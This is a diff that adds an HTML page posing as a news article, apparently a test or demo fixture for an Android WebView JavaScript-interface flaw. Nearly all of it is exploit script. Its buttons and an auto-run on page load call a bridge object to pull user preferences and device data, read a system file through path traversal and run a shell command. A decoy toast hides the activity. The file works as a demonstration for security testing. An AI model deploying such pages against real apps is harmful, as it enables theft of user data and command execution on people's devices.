@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>News Article</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; }
+        .article { background: white; padding: 20px; border-radius: 5px; }
+        .exploit-btn { background: #ff4444; color: white; padding: 10px; margin: 5px; border: none; border-radius: 3px; }
+    </style>
+</head>
+<body>
+    <div class="article">
+        <h1>Breaking News: Security Update Required</h1>
+        <p>This appears to be a legitimate news article, but it contains malicious JavaScript that exploits the WebView JavaScript interface.</p>
+        
+        <button class="exploit-btn" onclick="getUserInfo()">Load User Profile</button>
+        <button class="exploit-btn" onclick="getDeviceInfo()">Check Device Compatibility</button>
+        <button class="exploit-btn" onclick="saveUserData()">Save Reading Preferences</button>
+        <button class="exploit-btn" onclick="readSystemFile()">Advanced Settings</button>
+        <button class="exploit-btn" onclick="executeSystemCommand()">System Optimization</button>
+        
+        <div id="results"></div>
+    </div>
+
+    <script>
+        // MALICIOUS JAVASCRIPT EXPLOITING THE JAVASCRIPT INTERFACE
+        
+        function getUserInfo() {
+            try {
+                var userInfo = NewsReader.getUserPreferences();
+                document.getElementById('results').innerHTML += '<p><strong>User Data Extracted:</strong> ' + userInfo + '</p>';
+            } catch(e) {
+                document.getElementById('results').innerHTML += '<p>Error: ' + e + '</p>';
+            }
+        }
+        
+        function getDeviceInfo() {
+            try {
+                var deviceInfo = NewsReader.getDeviceInfo();
+                document.getElementById('results').innerHTML += '<p><strong>Device Info:</strong> ' + deviceInfo + '</p>';
+            } catch(e) {
+                document.getElementById('results').innerHTML += '<p>Error: ' + e + '</p>';
+            }
+        }
+        
+        function saveUserData() {
+            try {
+                var success = NewsReader.saveArticleData("stolen_data", "user_credentials:admin:password123");
+                document.getElementById('results').innerHTML += '<p><strong>Data Saved:</strong> ' + success + '</p>';
+            } catch(e) {
+                document.getElementById('results').innerHTML += '<p>Error: ' + e + '</p>';
+            }
+        }
+        
+        function readSystemFile() {
+            try {
+                var fileContent = NewsReader.readLocalFile("../../../../../system/etc/hosts");
+                document.getElementById('results').innerHTML += '<p><strong>System File:</strong> ' + fileContent.substring(0, 200) + '...</p>';
+            } catch(e) {
+                document.getElementById('results').innerHTML += '<p>Error: ' + e + '</p>';
+            }
+        }
+        
+        function executeSystemCommand() {
+            try {
+                var result = NewsReader.executeCommand("id");
+                document.getElementById('results').innerHTML += '<p><strong>Command Result:</strong> ' + result + '</p>';
+            } catch(e) {
+                document.getElementById('results').innerHTML += '<p>Error: ' + e + '</p>';
+            }
+        }
+        
+        // Auto-execute some exploits when page loads
+        window.onload = function() {
+            document.getElementById('results').innerHTML += '<h2>🔓 JavaScript Interface Exploitation Active</h2>';
+            
+            setTimeout(function() {
+                try {
+                    var userData = NewsReader.getUserPreferences();
+                    document.getElementById('results').innerHTML += '<p><strong>🎯 STOLEN USER DATA:</strong><br>' + userData + '</p>';
+                    
+                    var deviceData = NewsReader.getDeviceInfo();
+                    document.getElementById('results').innerHTML += '<p><strong>📱 DEVICE INFO:</strong><br>' + deviceData + '</p>';
+                    
+                    // Show innocent toast to hide the attack
+                    NewsReader.showToast("Article loaded successfully");
+                    
+                    // Log to console for debugging
+                    console.log("VULNERABILITY EXPLOITED - User Data:", userData);
+                    console.log("VULNERABILITY EXPLOITED - Device Info:", deviceData);
+                    
+                } catch(e) {
+                    document.getElementById('results').innerHTML += '<p><strong>Error:</strong> ' + e + '</p>';
+                    console.log("Exploit failed:", e);
+                }
+            }, 1000);
+        };
+    </script>
+</body>
+</html>
